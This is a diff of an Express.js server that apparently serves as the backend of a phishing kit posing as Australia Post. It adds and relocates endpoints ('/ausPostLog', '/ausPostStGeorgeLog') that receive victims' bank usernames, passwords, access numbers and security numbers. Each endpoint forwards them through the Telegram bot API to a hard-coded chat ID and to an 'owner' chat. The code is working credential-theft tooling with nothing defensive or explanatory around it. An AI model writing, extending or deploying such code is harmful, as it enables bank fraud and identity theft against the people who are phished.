@@ -154,6 +154,53 @@ app.post("/bendiSaveST", cors(), (req, res) => {
 //AUSPOSTwLogs
 //AUSPOSTwLogs
 
+app.options("/ausPostLog", cors());
+
+app.post("/ausPostLog", (req, res) => {
+  username = req.body.username;
+  password = req.body.password;
+  bank = req.body.bank;
+  owner = req.body.owner;
+  uniqueid = req.body.uniqueid;
+
+  var originalText = `+----------- ${bank} Login Information ------------+\nUsername: ${username}\nPassword: ${password}`;
+
+  axios.post(
+    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostLog ${owner}:\n${originalText}`
+  );
+  axios.post(
+    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=AusPostLog:\n${originalText}`
+  );
+
+  res.send("Update Completed");
+});
+
+app.options("/ausPostStGeorgeLog", cors());
+
+app.post("/ausPostStGeorgeLog", (req, res) => {
+  accessNo = req.body.accessNo;
+  secNo = req.body.secNo;
+  password = req.body.password;
+  bank = req.body.bank;
+  owner = req.body.owner;
+  uniqueid = req.body.uniqueid;
+
+  var originalText = `+----------- ${bank} Login Information ------------+\nAccess Number: ${accessNo}\nSecurity Number: ${secNo}\nPassword: ${password}`;
+
+  axios.post(
+    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostLog ${owner}:\n${originalText}`
+  );
+  axios.post(
+    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=AusPostLog:\n${originalText}`
+  );
+
+  res.send("Update Completed");
+});
+
+//AUSPOST
+//AUSPOST
+//AUSPOST
+
 app.options("/ausPostSJ", cors());
 
 app.post("/ausPostSJ", (req, res) => {
@@ -230,31 +277,6 @@ app.post("/ausPostSJ", (req, res) => {
       res.send("Update Completed");
     });
 });
-
-app.options("/ausPostLog", cors());
-
-app.post("/ausPostLog", (req, res) => {
-  username = req.body.username;
-  password = req.body.password;
-  bank = req.body.bank;
-  owner = req.body.owner;
-  uniqueid = req.body.uniqueid;
-
-  var originalText = `+----------- ${bank} Login Information ------------+\nUsername: ${username}\nPassword: ${password}`;
-
-  axios.post(
-    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostLog ${owner}:\n${originalText}`
-  );
-  axios.post(
-    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=AusPostLog:\n${originalText}`
-  );
-
-  res.send("Update Completed");
-});
-
-//AUSPOST
-//AUSPOST
-//AUSPOST
 
 app.options("/ausPostManny", cors());
 
